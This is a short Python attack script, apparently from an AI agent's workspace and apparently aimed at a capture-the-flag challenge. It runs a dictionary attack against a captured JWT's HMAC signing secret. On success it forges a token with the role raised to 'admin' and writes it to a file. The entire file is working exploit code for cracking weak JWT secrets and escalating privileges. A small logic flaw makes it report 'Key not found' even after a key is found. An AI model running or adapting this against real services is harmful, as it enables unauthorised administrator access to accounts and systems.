import hmac
import hashlib
import base64
import subprocess
import json

original_payload_b64 = 'eyJzdWIiOiIxIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NzQ3MDY3MTJ9'
original_signature = 'CqErZOY8Ac-MBNgnLOXKu8G1WJlUzOIcrIkpu9ji6gA'

admin_payload = {'sub': '1', 'role': 'admin', 'exp': 1774706712}
admin_payload_b64 = base64.urlsafe_b64encode(json.dumps(admin_payload, separators=(',', ':')).encode()).decode().rstrip('=')

header = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'

# 字典攻击
with open(r'C:\Users\32728\.openclaw\workspace\rockyou_short.txt', 'w', encoding='utf-8', errors='ignore') as f:
    # 创建一个小字典
    passwords = [
        'password', '123456', '12345678', 'qwerty', 'abc123',
        'monkey', 'letmein', 'dragon', '111111', 'baseball',
        'iloveyou', 'trustno1', 'sunshine', 'master', 'hello',
        'freedom', 'whatever', 'qazwsx', 'admin', 'welcome',
        'football', 'jesus', 'ninja', 'mustang', 'password1',
        '1star', 'star', 'xm', 'xmuser', 'ctf', 'ctfplus',
        'staralliance', 'jwt', 'secret', 'key', '123',
        '2024', '2025', 'star2024', 'ctf2024',
    ]
    for p in passwords:
        f.write(p + '\n')

print('Starting dictionary attack...')
count = 0
with open(r'C:\Users\32728\.openclaw\workspace\rockyou_short.txt', 'r', encoding='utf-8', errors='ignore') as f:
    for line in f:
        key = line.strip()
        if not key:
            continue

        count += 1
        message = header + '.' + original_payload_b64
        signature = hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')

        if signature_b64 == original_signature:
            print(f'✅ FOUND KEY: {key!r} (tried {count} passwords)')

            message_admin = header + '.' + admin_payload_b64
            signature_admin = hmac.new(key.encode(), message_admin.encode(), hashlib.sha256).digest()
            signature_admin_b64 = base64.urlsafe_b64encode(signature_admin).decode().rstrip('=')
            jwt_admin = message_admin + '.' + signature_admin_b64

            print(f'Admin JWT: {jwt_admin}')

            # 保存到文件
            with open(r'C:\Users\32728\.openclaw\workspace\admin_token.txt', 'w') as fw:
                fw.write(jwt_admin)
            print('Saved to admin_token.txt')
            break

print(f'Key not found (tried {count} passwords)')
